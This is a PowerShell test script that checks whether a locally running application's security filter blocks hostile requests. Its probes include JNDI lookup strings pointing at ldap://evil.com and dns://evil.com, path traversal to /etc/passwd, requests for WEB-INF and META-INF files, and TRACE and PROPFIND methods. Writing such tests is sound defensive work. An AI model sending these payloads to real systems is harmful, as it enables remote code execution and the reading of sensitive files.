# Security Filter Automated Test Script
# Usage: .\test-security.ps1
# Description: Comprehensive security testing for Jetbrains-Help application

param(
    [string]$BaseUrl = "http://localhost:10768",
    [switch]$Verbose,
    [switch]$NoColor
)

# ==================== Configuration ====================
$TestResults = @()
$PassCount = 0
$FailCount = 0
$WarnCount = 0

# ==================== Helper Functions ====================

function Write-Colored {
    param([string]$Message, [string]$Color = "White")
    
    if ($NoColor) {
        Write-Host $Message
    } else {
        Write-Host $Message -ForegroundColor $Color
    }
}

function Write-Separator {
    Write-Colored "========================================" "Cyan"
}

function Write-Section {
    param([string]$Title)
    Write-Host ""
    Write-Separator
    Write-Colored "  $Title" "Cyan"
    Write-Separator
    Write-Host ""
}

function Test-Endpoint {
    param(
        [string]$TestName,
        [string]$Url,
        [string]$Method = "GET",
        [int[]]$ExpectedStatus,
        [string]$Description = ""
    )
    
    try {
        $params = @{
            Uri = $Url
            Method = $Method
            TimeoutSec = 5
            UseBasicParsing = $true
        }
        
        $response = Invoke-WebRequest @params
        
        # Request succeeded (2xx status)
        if ($ExpectedStatus -contains $response.StatusCode) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:FailCount++
            $result = "FAIL"
        }
    } catch {
        # Request failed (4xx/5xx status)
        $statusCode = $_.Exception.Response.StatusCode.value__
        
        if ($ExpectedStatus -contains $statusCode) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:FailCount++
            $result = "FAIL"
        }
    }
    
    # Store result
    $script:TestResults += [PSCustomObject]@{
        Test = $TestName
        Result = $result
        URL = "$Method $Url"
        Expected = ($ExpectedStatus -join '/')
    }
}

# ==================== Pre-flight Check ====================

Write-Section "Security Filter Test Suite"
Write-Colored "Target: $BaseUrl" "White"
Write-Colored "Time: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')" "White"
Write-Host ""

# Check if server is running
try {
    # Try root path first, fallback to common endpoints
    $checkUrls = @(
        "$BaseUrl/",
        "$BaseUrl/index.html"
    )
    
    $serverRunning = $false
    foreach ($url in $checkUrls) {
        try {
            $healthCheck = Invoke-WebRequest -Uri $url -TimeoutSec 3 -UseBasicParsing
            if ($healthCheck.StatusCode -eq 200) {
                $serverRunning = $true
                break
            }
        } catch {
            # Try next URL
            continue
        }
    }
    
    if (-not $serverRunning) {
        Write-Colored "Cannot connect to server at $BaseUrl" "Red"
        Write-Colored "Please ensure the application is started." "Yellow"
        exit 1
    }
} catch {
    Write-Colored "Cannot connect to server at $BaseUrl" "Red"
    Write-Colored "Please ensure the application is started." "Yellow"
    exit 1
}

# ==================== Security Tests ====================

# Test 1: Normal request
Test-Endpoint `
    -TestName "Normal GET request" `
    -Url "$BaseUrl/" `
    -Method "GET" `
    -ExpectedStatus @(200) `
    -Description "Legitimate requests should succeed"

# Test 2: JNDI injection in URL path
Test-Endpoint `
    -TestName "JNDI injection in URL path" `
    -Url "$BaseUrl/%24%7Bjndi:ldap://evil.com/a%7D" `
    -Method "GET" `
    -ExpectedStatus @(400) `
    -Description "Should block JNDI injection attempts (${jndi:...})"

# Test 3: JNDI injection in query parameter
Test-Endpoint `
    -TestName "JNDI injection in query parameter" `
    -Url "$BaseUrl/test?callback=%24%7Bjndi:dns://evil.com%7D" `
    -Method "GET" `
    -ExpectedStatus @(400) `
    -Description "Should detect JNDI patterns in parameters"

# Test 4: Path traversal attack
Test-Endpoint `
    -TestName "Path traversal attack" `
    -Url "$BaseUrl/../../../etc/passwd" `
    -Method "GET" `
    -ExpectedStatus @(403, 404) `
    -Description "Should prevent directory traversal (../)"

# Test 5: WEB-INF access attempt
Test-Endpoint `
    -TestName "WEB-INF directory access" `
    -Url "$BaseUrl/WEB-INF/web.xml" `
    -Method "GET" `
    -ExpectedStatus @(403, 404) `
    -Description "Should block access to WEB-INF directory"

# Test 6: META-INF access attempt
Test-Endpoint `
    -TestName "META-INF directory access" `
    -Url "$BaseUrl/META-INF/MANIFEST.MF" `
    -Method "GET" `
    -ExpectedStatus @(403, 404) `
    -Description "Should block access to META-INF directory"

# Test 7: TRACE method (using curl.exe if available)
$traceTested = $false
if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    try {
        $curlOutput = & curl.exe -X TRACE "$BaseUrl/" -s -o nul -w "%{http_code}" 2>&1
        $traceStatus = [int]$curlOutput
        
        if ($traceStatus -eq 405) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:FailCount++
            $result = "FAIL"
        }
        $traceTested = $true
    } catch {
        $script:WarnCount++
        $result = "WARN"
    }
} else {
    # Fallback to PowerShell
    try {
        $response = Invoke-WebRequest -Uri "$BaseUrl/" -Method TRACE -TimeoutSec 5 -UseBasicParsing
        $script:FailCount++
        $result = "FAIL"
    } catch {
        $statusCode = $_.Exception.Response.StatusCode.value__
        if ($statusCode -eq 405) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:WarnCount++
            $result = "WARN"
        }
    }
}

$script:TestResults += [PSCustomObject]@{
    Test = "TRACE HTTP method"
    Result = $result
    URL = "TRACE /"
    Expected = "405"
}

# Test 8: Other dangerous methods
$propfindTested = $false
if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    try {
        $curlOutput = & curl.exe -X PROPFIND "$BaseUrl/" -s -o nul -w "%{http_code}" 2>&1
        $propfindStatus = [int]$curlOutput
        
        if ($propfindStatus -eq 405) {
            $script:PassCount++
            $result = "PASS"
        } else {
            $script:WarnCount++
            $result = "WARN"
        }
        $propfindTested = $true
    } catch {
        $script:WarnCount++
        $result = "WARN"
    }
} else {
    $script:WarnCount++
    $result = "SKIP"
}

$script:TestResults += [PSCustomObject]@{
    Test = "PROPFIND method (WebDAV)"
    Result = $result
    URL = "PROPFIND /"
    Expected = "405"
}

# Test 9: Encoded path traversal
# Note: Tomcat decodes %2e%2e to .. before our filter sees it, so it may return 404
Test-Endpoint `
    -TestName "URL-encoded path traversal" `
    -Url "$BaseUrl/%2e%2e/%2e%2e/%2e%2e/etc/passwd" `
    -Method "GET" `
    -ExpectedStatus @(400, 403, 404) `
    -Description "Should detect encoded traversal attempts (may be caught by JNDI filter)"

# Test 10: Multiple JNDI patterns
Test-Endpoint `
    -TestName "Multiple JNDI patterns" `
    -Url "$BaseUrl/test?x=%24%7Bjndi:ldap://a%7D&y=%24%7Bjndi:rmi://b%7D" `
    -Method "GET" `
    -ExpectedStatus @(400) `
    -Description "Should detect multiple JNDI injections"

# ==================== Test Summary ====================

Write-Section "Test Results"

Write-Host ""
Write-Colored "Total: $($TestResults.Count) | Passed: $PassCount | Failed: $FailCount" "White"
if ($WarnCount -gt 0) {
    Write-Colored "Warnings: $WarnCount" "Yellow"
}
Write-Host ""

# Calculate success rate
if ($TestResults.Count -gt 0) {
    $successRate = [math]::Round(($PassCount / $TestResults.Count) * 100, 2)
    Write-Colored "Success Rate: $successRate%" "White"
    Write-Host ""
}

# Detailed results table
Write-Separator
foreach ($test in $TestResults) {
    $icon = switch ($test.Result) {
        "PASS" { "[OK]" }
        "FAIL" { "[XX]" }
        "WARN" { "[!!]" }
        default { "[??]" }
    }
    
    $color = switch ($test.Result) {
        "PASS" { "Green" }
        "FAIL" { "Red" }
        "WARN" { "Yellow" }
        default { "White" }
    }
    
    Write-Colored "$icon $($test.Test.PadRight(40)) [$($test.Result)]" $color
}
Write-Separator

# Final verdict
Write-Host ""
if ($FailCount -eq 0) {
    Write-Colored "SUCCESS: All tests passed!" "Green"
} else {
    Write-Colored "WARNING: Some tests failed." "Yellow"
}
Write-Host ""

# Exit code
if ($FailCount -eq 0) {
    exit 0
} else {
    exit 1
}
